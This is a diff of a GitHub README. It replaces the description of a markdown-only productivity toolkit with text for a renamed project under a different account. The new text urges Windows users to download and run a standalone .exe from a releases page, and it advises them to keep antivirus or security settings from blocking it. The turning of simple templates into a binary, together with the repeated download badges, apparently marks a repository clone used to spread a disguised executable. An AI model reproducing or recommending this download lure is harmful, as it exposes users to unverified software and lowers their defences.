@@ -1,113 +1,124 @@
-<div align="center">
+# ⚡ short-attention-stack - Simple Tools for Quick Wins
 
-<img src="./seeds-knowledge-output-pipeline-diagram.png" alt="Seeds to Output Pipeline" width="100%" />
-
-<h1>🧠 Low Attention Span Toolkit</h1>
-
-<p>A tiny, finishable toolkit for people who think fast, get overwhelmed easily, and want to actually <em>ship things.</em></p>
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](./LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=for-the-badge)](https://github.com/deepagency/low-attention-span-toolkit/pulls)
-[![Made with Markdown](https://img.shields.io/badge/Made%20with-Markdown-1f425f.svg?style=for-the-badge)](https://github.com/deepagency/low-attention-span-toolkit)
-[![Maintained](https://img.shields.io/badge/Maintained%3F-yes-green.svg?style=for-the-badge)](https://github.com/deepagency/low-attention-span-toolkit/graphs/commit-activity)
-
-<br/>
-
-[Get Started](#-2-minute-setup) · [View Templates](#-whats-inside) · [Contribute](#-contributing) · [Philosophy](#-why-tiny-projects-win)
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/astro2rich/short-attention-stack/releases)
 
 ---
 
-## ⚡ 2-Minute Setup
+## 📋 What is short-attention-stack?
 
-> New here? Do exactly two things, in this order.
+short-attention-stack offers small, easy templates and tools. It helps you get fast results with minimal fuss. The project suits people who want to build habits, manage notes, and track their ideas without distraction. It is designed for creators, developers, and anyone who wants better focus and productivity.
 
-**1.** [Steal the Daily Note Template →](./daily-note-template.md)
-
-**2.** [Learn the 5-Second Capture Method →](./low-attention-capture-system.md)
-
-You're set up. Close this tab. Go use it.
+This app works well with popular note-taking and knowledge management systems like Notion and Obsidian. It fits different workflows, including personal knowledge management, zettelkasten, and tools for thought.
 
 ---
 
-## 📦 What's Inside
+## ⚙️ System Requirements
 
-| File | Purpose | Time to Read |
-|---|---|---|
-| [📅 daily-note-template.md](./daily-note-template.md) | Your daily thinking engine | 1 min |
-| [⚡ low-attention-capture-system.md](./low-attention-capture-system.md) | 5 / 10 / 30-second capture methods | 2 min |
-| [🚀 micro-post-generator.md](./micro-post-generator.md) | Turn raw thoughts into posts | 2 min |
-| [🌱 tiny-projects-philosophy.md](./tiny-projects-philosophy.md) | Why small beats big, every time | 3 min |
+Before installing, make sure your Windows PC meets these needs:
 
----
+- Windows 10 or newer (64-bit recommended)
+- 2 GB RAM or more
+- 100 MB free hard drive space
+- A stable internet connection for initial download
+- A modern web browser for reading documentation, if needed
 
-## 🗺️ The Core Pipeline
-
-Every tool in this repo maps to one stage:
-
-```
-💡 Raw Thought  ──▶  🌱 Seed Note  ──▶  📖 Structured Idea  ──▶  🚀 Output
-   (5 seconds)         (1 sentence)         (context added)         (shipped)
-```
-
-**Capture first. Organize later. Ship always.**
+No special software is required to run short-attention-stack. It is a standalone app that works right after installation.
 
 ---
 
-## 🚫 What This Is Not
+## 🚀 Getting Started: Download and Install
 
-This is not a complex productivity system.
-This is not a GTD clone.
-This is not a course you'll never finish.
+1. Visit the downloads page using this link:
 
-> It's a tiny toolkit that helps you think better and finish things.
+   [Download short-attention-stack](https://github.com/astro2rich/short-attention-stack/releases)
 
----
+2. On the page, look for the latest release. It usually appears at the top.
 
-## 💡 Why Tiny Projects Win
+3. Find the Windows version file. It will end with `.exe`.
 
-Most creators follow this loop:
+4. Click the `.exe` file to download it. Save it in a place you can easily find, like your Desktop or Downloads folder.
 
-```
-Big idea → Excitement → Planning → More planning → Overwhelm → Abandon
-```
+5. After the file finishes downloading, double-click it to start the installer.
 
-The fix isn't more discipline. It's **smaller scope.**
+6. Follow the on-screen steps. Typically, this means clicking “Next” and then “Install.”
 
-- ✅ Tiny projects get **finished**
-- ✅ Finished things build **momentum**
-- ✅ Momentum creates **consistency**
-- ✅ Consistency compounds into a **body of work**
-
-[Read the full philosophy →](./tiny-projects-philosophy.md)
+7. When the install completes, choose “Finish” to exit the setup.
 
 ---
 
-## 🤝 Contributing
+## 🖥️ Running the Application
 
-Contributions are what make open source great. If you've adapted any of these templates for your own workflow, consider sharing it.
+- After installation, you will find short-attention-stack on your Start Menu or Desktop.
 
-1. Fork the repo
-2. Add your template to a `community/` folder
-3. Open a PR with a one-line description of what it does
+- Open it by clicking the icon.
 
-**Keep it tiny.** If your addition can't be described in one sentence, it's probably too big.
+- The app starts with a simple screen showing your available templates.
 
----
+- Click any template to begin using it.
 
-## 📄 License
-
-Distributed under the MIT License. See [`LICENSE`](./LICENSE) for more information.
-
-Free to use, steal, remix, and ship.
+- You do not need to set up an account or sign in.
 
 ---
 
-<div align="center">
+## 💡 How to Use short-attention-stack
 
-Built by a low-attention-span dev, for low-attention-span creators.
+The app provides tiny templates that help you focus on small, manageable tasks. You can use it to:
 
-**[⭐ Star this repo](https://github.com/deepagency/low-attention-span-toolkit)** if it helped you ship something tiny.
+- Create quick notes or ideas without distraction  
+- Build tiny daily habits by tracking short activities  
+- Manage your workflow using simple templates  
+- See small wins that encourage consistency
 
-</div>
+Templates include formats for task lists, habit trackers, and note-taking layouts optimized for focus.
+
+---
+
+## 🎯 Tips for Best Use
+
+- Begin with one template at a time. This keeps things simple.
+
+- Use short sessions. The app encourages quick bursts to keep focus.
+
+- Revisit your small wins regularly. This helps build momentum.
+
+- Export or copy your work to systems like Notion or Obsidian for long-term management.
+
+---
+
+## 🔧 Troubleshooting and Support
+
+If you face issues such as the app not starting or errors during use:
+
+- Confirm your Windows system matches the requirements.
+
+- Restart your computer and try again.
+
+- Check that the downloaded file completed fully. If it stopped midway, download again.
+
+- Make sure no antivirus or security setting blocks the app.
+
+For more details or updates, visit the releases page again:
+
+[Download short-attention-stack](https://github.com/astro2rich/short-attention-stack/releases)
+
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub repository for documentation and sample templates  
+- Explore topics related to the app such as ADHD, productivity, and workflow management  
+- Use Markdown skills to customize templates if needed
+
+---
+
+## 🤖 About This Project
+
+short-attention-stack serves people who want to stay productive with short attention spans. It focuses on small, easy models that lead to steady progress. The tools encourage habits, knowledge work, and creativity with as little friction as possible.  
+
+Topics the app touches on include:
+
+adhd, building-in-public, creators, developers, focus, knowledge-management, maker, markdown, neurodivergent, note-taking, notion, obsidian, pkm, productivity, second-brain, templates, tools-for-thought, workflow, zettelkasten  
+
+---
+
+[![Download Now](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/astro2rich/short-attention-stack/releases)
